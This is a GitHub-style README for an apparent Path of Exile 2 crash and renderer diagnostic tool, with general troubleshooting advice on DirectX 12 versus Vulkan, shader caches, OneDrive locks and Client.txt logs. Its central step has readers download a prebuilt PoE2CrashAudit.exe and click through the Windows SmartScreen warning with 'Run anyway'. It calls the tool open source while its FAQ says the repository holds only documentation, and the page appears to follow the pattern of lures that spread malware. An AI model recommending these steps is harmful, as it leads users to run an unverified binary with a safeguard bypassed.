<p align="center">
  <img src="https://i.postimg.cc/XYSN4pJX/banner.png" alt="PoE 2 Renderer & Crash Audit — DirectX 12, Vulkan & Client.txt Diagnostics for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Renderer%20%26%20Log%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-poe2--crash--audit--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# PoE 2 Renderer & Crash Audit — DirectX 12, Vulkan & Client.txt Diagnostics for Windows

**Path of Exile 2 crashing to desktop when entering towns or maps? Heavy frame spikes when new skills trigger, or graphics settings resetting after closing the game? Check your renderer config, shader caches, and Client.txt logs before reinstalling.**

PoE 2 Renderer & Crash Audit focuses on the local Windows bottlenecks that trigger desktop crashes in Path of Exile 2: **DirectX 12 vs. Vulkan device-removed errors**, read-only or OneDrive-locked `poe2_production_Config.ini` files inside `Documents\My Games\Path of Exile 2`, and corrupted shader cache directories.

This project is aimed at **Path of Exile 2 on Windows (Steam and Standalone)**. It covers renderer settings, shader-cache directories, and `Client.txt` error inspection—not game automation, overlay injection, or modifying client files.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Crash to desktop (`DXGI_ERROR_DEVICE_REMOVED`) | GPU driver timeout under `DirectX12` when entering towns/maps | Inspect `logs\Client.txt` and test `renderer_type=Vulkan` |
| Heavy frame spikes when new skills trigger | Blocked or full `ShaderCacheD3D12` / `ShaderCacheVulkan` folder | Verify shader cache folder permissions and disk space |
| Graphics or keybind settings revert on exit | Windows OneDrive locking `Documents\My Games\Path of Exile 2` | Check whether `poe2_production_Config.ini` is synced by OneDrive |
| Audio crackling or thread stalls in dense packs | High software audio channel count overloading CPU threads | Inspect audio settings in `poe2_production_Config.ini` |

## Download for Windows

[**Download PoE2CrashAudit.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/PoE2CrashAudit.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `PoE2CrashAudit.exe`? (Automatic checks in ~2 seconds)

- Detects whether `Documents\My Games\Path of Exile 2` is local or synced via OneDrive.
- Reads `poe2_production_Config.ini` to display active `renderer_type` (`DirectX12` vs. `Vulkan`).
- Inspects `ShaderCacheD3D12` and `ShaderCacheVulkan` folders for file counts and write access.
- Scans the tail of `logs\Client.txt` for `DEVICE_REMOVED`, `Exception`, or asset errors.

### Sample Diagnostic Output

```text
[PoE2CrashAudit] Inspecting Path of Exile 2 configuration & Client.txt...
[OK]   My Games Path    : C:\Users\Player\Documents\My Games\Path of Exile 2 (Local, non-OneDrive)
[INFO] Active Renderer  : renderer_type=DirectX12
[OK]   ShaderCacheD3D12 : 1,284 cached pipeline files
[ERROR] logs\Client.txt : Line 48912 - [D3D12] DXGI_ERROR_DEVICE_REMOVED detected
```

The release ZIP is named `PoE2CrashAudit.zip`; the Windows executable inside is named `PoE2CrashAudit.exe`.

1. Close Path of Exile 2 before moving or checking game files.
2. Click **Download PoE2CrashAudit.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `PoE2CrashAudit.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Path of Exile 2 and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Steam or Standalone Windows installation of Path of Exile 2, and access to `Documents\My Games`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `PoE2CrashAudit.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Crash to desktop with DXGI device-removed errors

Certain GPU driver and Windows build combinations hit `DXGI_ERROR_DEVICE_REMOVED` under `DirectX12`. Inspecting `Client.txt` and testing `renderer_type=Vulkan` in `poe2_production_Config.ini` quickly isolates renderer-specific crashes.

### Heavy frame spikes whenever new effects appear

Path of Exile 2 stores compiled pipelines in `ShaderCacheD3D12` and `ShaderCacheVulkan` inside `My Games\Path of Exile 2`. If disk space is low or permissions block writes, shaders recompile repeatedly during combat.

### Graphics or keybind settings revert on restart

When Windows OneDrive syncs `Documents`, file locks on `poe2_production_Config.ini` can prevent the game from saving updated settings cleanly on exit.

### Audio crackling or thread stalls in dense encounters

High software audio channel counts or background capture hooks can spike CPU frametimes during heavy particle effects.

## Where Path of Exile 2 files normally belong

On Windows, configuration files, loot filters, and shader caches live under your user Documents folder:

```text
%USERPROFILE%\Documents\My Games\Path of Exile 2\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Documents\My Games\Path of Exile 2\
├── poe2_production_Config.ini
├── ShaderCacheD3D12\
├── ShaderCacheVulkan\
└── *.filter
```

If OneDrive Backup is active on your PC, Windows may redirect `Documents` to `%USERPROFILE%\OneDrive\Documents\My Games\Path of Exile 2\`. Client logs (`logs\Client.txt`) reside inside the game's installation folder.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Path of Exile 2 completely.** Confirm `PathOfExileSteam.exe` or `PathOfExile.exe` is no longer running in Task Manager.
2. **Back up `poe2_production_Config.ini`.** Copy `poe2_production_Config.ini` to a dated backup folder before editing renderer or audio lines.
3. **Check `logs\Client.txt` for crash signatures.** Inspect the end of `Client.txt` for `DEVICE_REMOVED`, `Exception`, or shader compilation errors.
4. **Test switching between `DirectX12` and `Vulkan`.** Change `renderer_type` in `poe2_production_Config.ini` (or in-game Options) and test the same town/map instance.
5. **Verify OneDrive sync status on `My Games`.** Ensure `Documents\My Games\Path of Exile 2` is not locked or conflicted by OneDrive cloud sync.
6. **Verify game pack files.** Run *Verify integrity of game files* in Steam (or `PackCheck.exe` for Standalone) if asset exceptions appear in `Client.txt`.
7. **Restart the client and observe the shader bar.** Use the in-game F1 performance graph to confirm shader compilation settles after loading into town.

### Before moving any files

Keep an untouched copy of `poe2_production_Config.ini` and any custom `.filter` files before clearing `ShaderCacheD3D12` or `ShaderCacheVulkan`.

## What an effective diagnostic report should tell you

A thorough audit identifies **which `Documents` path is active (local vs. OneDrive)**, reads the configured `renderer_type`, checks shader cache folder health, and extracts recent error lines from `Client.txt` without exposing personal account details.

## FAQ

**Where is poe2_production_Config.ini located on Windows?**

It is stored in `%USERPROFILE%\Documents\My Games\Path of Exile 2\poe2_production_Config.ini` (or inside `OneDrive\Documents` if OneDrive folder backup is enabled).

**Should I use DirectX 12 or Vulkan in Path of Exile 2?**

DirectX 12 is the default on Windows, but switching to Vulkan often resolves GPU driver crashes on specific NVIDIA/AMD driver releases.

**Where is Client.txt located?**

Inside the game installation folder under `logs\Client.txt` (e.g., `steamapps\common\Path of Exile 2\logs\Client.txt`).

**Does clearing ShaderCache fix low FPS permanently?**

No. Clearing the cache forces shaders to rebuild from scratch, which temporarily increases stuttering until areas are visited again.

**Can this tool recover lost trade items or server rollbacks?**

No. Server-side character state is managed exclusively by Grinding Gear Games.

**Are any game files or third-party tools included?**

No. This repository provides documentation and release packaging instructions only.

## Useful reading

- [Path of Exile 2 on Steam](https://store.steampowered.com/app/2694490/Path_of_Exile_2/)
- [Official Path of Exile Website](https://www.pathofexile.com/)

## More Windows Game Diagnostic Tools

- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 DX12 shader compilation & `C:` space check
- [MHWilds-ShaderFrameDoctor](../MHWilds-ShaderFrameDoctor) — Monster Hunter Wilds `shader.cache2` & `CrashReport` audit
- [CrimsonDesert-ShaderFrameDoctor](../CrimsonDesert-ShaderFrameDoctor) — Crimson Desert DX12 shader cache & save diagnostics
- [Helldivers2-ShaderCacheGuard](../Helldivers2-ShaderCacheGuard) — HELLDIVERS 2 `shader_cache` & `user_settings.config` check

*Independent community project. Not affiliated with Grinding Gear Games, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
